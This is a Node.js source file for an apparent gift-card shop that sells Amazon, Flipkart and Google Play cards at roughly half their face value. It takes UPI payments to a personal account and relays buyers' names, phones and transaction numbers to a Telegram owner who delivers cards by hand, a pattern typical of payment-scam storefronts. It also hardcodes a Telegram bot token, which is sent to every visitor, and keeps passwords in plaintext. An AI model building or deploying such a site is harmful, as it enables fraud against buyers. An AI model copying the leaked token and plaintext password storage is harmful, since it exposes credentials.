import http from 'http';

const BOT_TOKEN = "8674826347:AAHLN8nGRz7pVN1Vh9AdjnAbCoQ5R5n8dCk";
const OWNER_ID = "8558052873";
const PORT = process.env.PORT || 3000;
const BOT_USERNAME = "Giftclerkbot";

const HTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gift Card Shop</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#0a0a2a,#0f0f3a);min-height:100vh;color:#fff;padding:20px;}
        .container{max-width:500px;margin:0 auto;}
        .card{background:rgba(255,255,255,0.1);border-radius:20px;padding:25px;margin-bottom:20px;border:1px solid #00ff88;text-align:center;}
        h2{color:#00ff88;margin-bottom:20px;}
        input{width:100%;padding:12px;margin:10px 0;background:#1a1a3a;border:1px solid #00ff88;border-radius:10px;color:#fff;font-size:16px;box-sizing:border-box;}
        button{width:100%;padding:12px;background:#00ff88;border:none;border-radius:10px;color:#0a0a2a;font-weight:bold;font-size:16px;cursor:pointer;margin-top:10px;}
        button.secondary{background:#333;color:#fff;}
        .platform-btn{display:inline-block;padding:10px 20px;margin:5px;background:#1a1a3a;border:1px solid #00ff88;border-radius:25px;cursor:pointer;}
        .platform-btn.active{background:#00ff88;color:#0a0a2a;}
        .gift-item{display:flex;justify-content:space-between;padding:15px;border-bottom:1px solid #333;cursor:pointer;background:#1a1a3a;margin:5px 0;border-radius:10px;}
        .gift-item:hover{background:#2a2a4a;}
        .gift-price{color:#00ff88;font-weight:bold;}
        .hidden{display:none;}
        .telegram-btn{display:inline-block;background:#0088cc;color:#fff;padding:15px 30px;border-radius:50px;text-decoration:none;margin:15px 0;font-weight:bold;}
        .qr-img{width:200px;margin:15px auto;display:block;background:#fff;padding:10px;border-radius:16px;}
        .popup{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;display:none;justify-content:center;align-items:center;}
        .popup.active{display:flex;}
        .popup-card{background:#1a1a3a;border-radius:30px;padding:35px;width:100%;max-width:380px;text-align:center;border:1px solid #00ff88;}
        .status-pending{color:#ffaa00;}
        .note{font-size:12px;color:#888;margin-top:10px;}
    </style>
</head>
<body>
<div class="container" id="app"></div>

<script>
const BOT_TOKEN = "${BOT_TOKEN}";
const OWNER_ID = "${OWNER_ID}";
const BOT_USERNAME = "${BOT_USERNAME}";
let currentUser = null;
let currentGift = null;
let currentPlatform = "amazon";
let pollingInterval = null;

function saveUser(user){
    let users = JSON.parse(localStorage.getItem('users') || '{}');
    users[user.phone] = user;
    localStorage.setItem('users', JSON.stringify(users));
}

function getUsers(){
    return JSON.parse(localStorage.getItem('users') || '{}');
}

function showMessage(msg, type){
    let msgDiv = document.getElementById('message');
    if(msgDiv){
        msgDiv.innerHTML = msg;
        msgDiv.style.color = type === 'error' ? '#ff8888' : '#00ff88';
        msgDiv.style.display = 'block';
        setTimeout(() => { msgDiv.style.display = 'none'; }, 3000);
    } else { alert(msg); }
}

function showLogin(){
    document.getElementById('app').innerHTML = \`
        <div class="card">
            <h2>🔐 GIFT CARD SHOP</h2>
            <div id="message" style="display:none;margin-bottom:10px;"></div>
            <input type="tel" id="phone" placeholder="Phone Number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="login()">Login</button>
            <button onclick="showRegister()" class="secondary">New User? Register</button>
        </div>
    \`;
}

function showRegister(){
    document.getElementById('app').innerHTML = \`
        <div class="card">
            <h2>📝 REGISTER</h2>
            <div id="message" style="display:none;margin-bottom:10px;"></div>
            <input type="text" id="name" placeholder="Full Name">
            <input type="tel" id="phone" placeholder="Phone Number">
            <input type="password" id="password" placeholder="Password">
            <button onclick="register()">Register</button>
            <button onclick="showLogin()" class="secondary">Back to Login</button>
        </div>
    \`;
}

function showBotVerification(){
    document.getElementById('app').innerHTML = \`
        <div class="card">
            <h2>🤖 VERIFY TELEGRAM</h2>
            <div id="message" style="display:none;margin-bottom:10px;"></div>
            <p>Click below to open Telegram bot:</p>
            <a href="tg://resolve?domain=\${BOT_USERNAME}" target="_blank" class="telegram-btn">📱 Open @\${BOT_USERNAME}</a>
            <p style="margin:15px 0;">Send <strong>/start</strong> to the bot</p>
            <p>Then paste the code you receive:</p>
            <input type="text" id="code" placeholder="Paste code from bot">
            <button onclick="verifyCode()">Verify & Continue</button>
            <div class="note">The code looks like: USER_123456789_1234567890</div>
        </div>
    \`;
}

function showShop(){
    const products = [
        {name:"Amazon ₹100", value:100, price:50},
        {name:"Amazon ₹200", value:200, price:100},
        {name:"Amazon ₹500", value:500, price:250},
        {name:"Amazon ₹1000", value:1000, price:499},
        {name:"Amazon ₹2000", value:2000, price:949},
        {name:"Amazon ₹5000", value:5000, price:2299},
        {name:"Flipkart ₹100", value:100, price:50},
        {name:"Flipkart ₹200", value:200, price:100},
        {name:"Flipkart ₹500", value:500, price:250},
        {name:"Flipkart ₹1000", value:1000, price:499},
        {name:"Flipkart ₹2000", value:2000, price:949},
        {name:"Google Play ₹100", value:100, price:50},
        {name:"Google Play ₹200", value:200, price:100},
        {name:"Google Play ₹500", value:500, price:250},
        {name:"Google Play ₹1000", value:1000, price:499}
    ];
    
    let productsHtml = '<div style="display:flex;gap:10px;justify-content:center;margin-bottom:20px;">' +
        '<div class="platform-btn active" data-platform="amazon">Amazon</div>' +
        '<div class="platform-btn" data-platform="flipkart">Flipkart</div>' +
        '<div class="platform-btn" data-platform="googleplay">Google Play</div>' +
        '</div><div id="giftList"></div>';
    
    document.getElementById('app').innerHTML = \`
        <div class="card">
            <h2>🛍️ Welcome \${currentUser.name}</h2>
            <div id="message" style="display:none;margin-bottom:10px;"></div>
            \${productsHtml}
            <div class="custom-section" style="margin-top:20px;">
                <input type="number" id="customAmount" placeholder="Custom amount (Min ₹100)" style="width:70%;display:inline-block;">
                <button onclick="generateCustom()" style="width:28%;display:inline-block;">Custom</button>
            </div>
            <div id="customPreview"></div>
            <button onclick="viewOrders()" class="secondary" style="margin-top:15px;">📦 My Orders</button>
            <button onclick="logout()" class="secondary" style="background:#ff4444;margin-top:5px;">Logout</button>
        </div>
        <div id="ordersSection" class="hidden"></div>
        <div id="paymentSection" class="hidden"></div>
        <div id="qrPopup" class="popup">
            <div class="popup-card">
                <h3>💳 Complete Payment</h3>
                <div id="paymentDetails"></div>
                <img id="qrImage" class="qr-img" src="">
                <p>UPI: <strong>ninadxclerk@fam</strong></p>
                <input type="text" id="utrNumber" placeholder="Enter UTR / Transaction ID">
                <button onclick="submitPayment()">Submit Payment</button>
                <button onclick="closePayment()" class="secondary">Cancel</button>
            </div>
        </div>
    \`;
    
    loadGifts();
    attachPlatformEvents();
}

function loadGifts(){
    const products = {
        amazon: [
            {name:"Amazon ₹100", value:100, price:50},
            {name:"Amazon ₹200", value:200, price:100},
            {name:"Amazon ₹500", value:500, price:250},
            {name:"Amazon ₹1000", value:1000, price:499},
            {name:"Amazon ₹2000", value:2000, price:949},
            {name:"Amazon ₹5000", value:5000, price:2299}
        ],
        flipkart: [
            {name:"Flipkart ₹100", value:100, price:50},
            {name:"Flipkart ₹200", value:200, price:100},
            {name:"Flipkart ₹500", value:500, price:250},
            {name:"Flipkart ₹1000", value:1000, price:499},
            {name:"Flipkart ₹2000", value:2000, price:949}
        ],
        googleplay: [
            {name:"Google Play ₹100", value:100, price:50},
            {name:"Google Play ₹200", value:200, price:100},
            {name:"Google Play ₹500", value:500, price:250},
            {name:"Google Play ₹1000", value:1000, price:499}
        ]
    };
    
    const container = document.getElementById('giftList');
    if(!container) return;
    container.innerHTML = '';
    products[currentPlatform].forEach(p => {
        const div = document.createElement('div');
        div.className = 'gift-item';
        div.innerHTML = '<span>' + p.name + '</span><span class="gift-price">Pay ₹' + p.price + '</span>';
        div.onclick = () => selectGift(p.name, p.value, p.price);
        container.appendChild(div);
    });
}

function attachPlatformEvents(){
    document.querySelectorAll('.platform-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            currentPlatform = btn.dataset.platform;
            loadGifts();
        };
    });
}

function generateCustom(){
    let amount = parseInt(document.getElementById('customAmount').value);
    if(!amount || amount < 100){ alert('Minimum amount ₹100'); return; }
    let price = Math.ceil(amount / 2);
    document.getElementById('customPreview').innerHTML = '<div class="gift-item" onclick="selectGift(\'Custom ₹'+amount+'\','+amount+','+price+')"><span>Custom ₹'+amount+'</span><span class="gift-price">Pay ₹'+price+'</span></div>';
}

function selectGift(name, value, price){
    currentGift = { name, value, price };
    showPayment();
}

function showPayment(){
    document.getElementById('paymentDetails').innerHTML = '<p><strong>'+currentGift.name+'</strong><br>Gift Value: ₹'+currentGift.value+'<br><span style="color:#00ff88;">You Pay: ₹'+currentGift.price+'</span></p>';
    const upi = 'upi://pay?pa=ninadxclerk@fam&pn=GIFTSHOP&am='+currentGift.price+'&cu=INR';
    document.getElementById('qrImage').src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(upi);
    document.getElementById('qrPopup').classList.add('active');
}

function closePayment(){
    document.getElementById('qrPopup').classList.remove('active');
}

function submitPayment(){
    let utr = document.getElementById('utrNumber').value;
    if(!utr){ alert('Enter UTR number'); return; }
    
    let orders = JSON.parse(localStorage.getItem('orders_'+currentUser.phone) || '[]');
    orders.push({
        id: Date.now(),
        name: currentGift.name,
        value: currentGift.value,
        price: currentGift.price,
        utr: utr,
        status: 'pending',
        date: new Date().toISOString()
    });
    localStorage.setItem('orders_'+currentUser.phone, JSON.stringify(orders));
    
    fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: OWNER_ID,
            text: '🆕 NEW ORDER!\\n\\nUser: '+currentUser.name+'\\nPhone: '+currentUser.phone+'\\nTelegram ID: '+currentUser.telegramId+'\\nProduct: '+currentGift.name+'\\nGift Value: ₹'+currentGift.value+'\\nPaid: ₹'+currentGift.price+'\\nUTR: '+utr
        })
    }).catch(e => console.log);
    
    alert('Payment submitted! You will receive gift card within 24 hours.');
    document.getElementById('utrNumber').value = '';
    closePayment();
    showMessage('Order placed successfully!', 'success');
}

function viewOrders(){
    let orders = JSON.parse(localStorage.getItem('orders_'+currentUser.phone) || '[]');
    if(orders.length === 0){
        alert('No orders yet');
        return;
    }
    let msg = '📦 YOUR ORDERS:\\n\\n';
    orders.forEach(o => {
        msg += '• '+o.name+' - ₹'+o.value+' (Paid: ₹'+o.price+')\\n   Status: '+o.status+'\\n   UTR: '+o.utr+'\\n\\n';
    });
    alert(msg);
}

function register(){
    let name = document.getElementById('name').value;
    let phone = document.getElementById('phone').value;
    let password = document.getElementById('password').value;
    if(!name || !phone || !password){ showMessage('Fill all fields','error'); return; }
    let users = getUsers();
    if(users[phone]){ showMessage('Phone already registered','error'); return; }
    saveUser({ name, phone, password, telegramId: null });
    showMessage('Registration successful! Please login.','success');
    setTimeout(() => showLogin(), 2000);
}

function login(){
    let phone = document.getElementById('phone').value;
    let password = document.getElementById('password').value;
    if(!phone || !password){ showMessage('Fill all fields','error'); return; }
    let users = getUsers();
    let user = users[phone];
    if(user && user.password === password){
        currentUser = user;
        if(!user.telegramId){
            showBotVerification();
            startPollingForCode();
        } else {
            showShop();
        }
    } else { showMessage('Invalid phone or password','error'); }
}

function startPollingForCode(){
    if(pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(() => {
        fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/getUpdates', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ offset: -1, limit: 10 })
        }).then(r => r.json()).then(data => {
            if(data.ok && data.result){
                for(let update of data.result){
                    if(update.message && update.message.text && update.message.text.includes('USER_')){
                        let code = update.message.text;
                        let telegramId = code.split('_')[1];
                        if(telegramId){
                            currentUser.telegramId = code;
                            let users = getUsers();
                            users[currentUser.phone].telegramId = code;
                            localStorage.setItem('users', JSON.stringify(users));
                            clearInterval(pollingInterval);
                            showMessage('Auto-verified! Redirecting...', 'success');
                            setTimeout(() => showShop(), 1500);
                        }
                    }
                }
            }
        }).catch(e => console.log);
    }, 3000);
}

function verifyCode(){
    let code = document.getElementById('code').value;
    if(!code){ showMessage('Enter code from bot','error'); return; }
    if(code.includes('USER_')){
        currentUser.telegramId = code;
        let users = getUsers();
        users[currentUser.phone].telegramId = code;
        localStorage.setItem('users', JSON.stringify(users));
        showMessage('Verified successfully!','success');
        setTimeout(() => showShop(), 1000);
    } else { showMessage('Invalid code format','error'); }
}

function logout(){
    currentUser = null;
    if(pollingInterval) clearInterval(pollingInterval);
    showLogin();
}

showLogin();
</script>
</body>
</html>`;

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML);
});

let offset = 0;

async function tg(method, data) {
    try {
        const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/' + method, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
        return await res.json();
    } catch(e) { return {}; }
}

async function poll() {
    while (true) {
        try {
            const data = await tg('getUpdates', { offset: offset, timeout: 30 });
            if (data.ok && data.result) {
                for (let i = 0; i < data.result.length; i++) {
                    const update = data.result[i];
                    offset = update.update_id + 1;
                    if (update.message && update.message.text === '/start') {
                        const chatId = update.message.chat.id;
                        const userId = update.message.from.id;
                        const code = 'USER_' + userId + '_' + Date.now();
                        
                        // Send code to user
                        await tg('sendMessage', {
                            chat_id: chatId,
                            text: '✅ YOUR VERIFICATION CODE:\n\n`' + code + '`\n\n📋 Tap to copy, then paste on website.',
                            parse_mode: 'Markdown'
                        });
                        
                        // Also send code to owner
                        await tg('sendMessage', {
                            chat_id: OWNER_ID,
                            text: '🆕 NEW USER VERIFICATION\n\nCode: `' + code + '`\nUser ID: ' + userId + '\nUsername: @' + (update.message.from.username || 'none'),
                            parse_mode: 'Markdown'
                        });
                        
                        console.log('Code sent to user ' + userId + ' and owner');
                    }
                    
                    // Handle /sendgc command for owner
                    if (update.message && update.message.text && update.message.text.startsWith('/sendgc') && update.message.chat.id.toString() === OWNER_ID) {
                        const parts = update.message.text.split(' ');
                        if (parts.length >= 3) {
                            const targetCode = parts[1];
                            const giftCode = parts.slice(2).join(' ');
                            
                            // Extract user ID from code
                            const match = targetCode.match(/USER_(\d+)_/);
                            if (match) {
                                const targetUserId = match[1];
                                await tg('sendMessage', {
                                    chat_id: targetUserId,
                                    text: '🎉 YOUR GIFT CARD IS HERE! 🎉\n\n📱 Platform: Gift Card\n🎁 Code: `' + giftCode + '`\n\nRedeem it on the respective platform.\n\nThank you for shopping! ❤️',
                                    parse_mode: 'Markdown'
                                });
                                await tg('sendMessage', {
                                    chat_id: OWNER_ID,
                                    text: '✅ Gift card sent to user ' + targetUserId
                                });
                            } else {
                                await tg('sendMessage', {
                                    chat_id: OWNER_ID,
                                    text: '❌ Invalid USER_ID format. Use: /sendgc USER_123456789_1234567890 GC_CODE'
                                });
                            }
                        } else {
                            await tg('sendMessage', {
                                chat_id: OWNER_ID,
                                text: '❌ Usage: /sendgc USER_ID_CODE GIFT_CARD_CODE'
                            });
                        }
                    }
                }
            }
        } catch(e) { console.log('Bot error:', e.message); }
        await new Promise(r => setTimeout(r, 2000));
    }
}

server.listen(PORT, () => {
    console.log('✅ Server on port ' + PORT);
    console.log('✅ Bot running! Send /start to @Giftclerkbot');
    console.log('✅ Owner commands: /sendgc USER_CODE GIFT_CODE');
});
poll();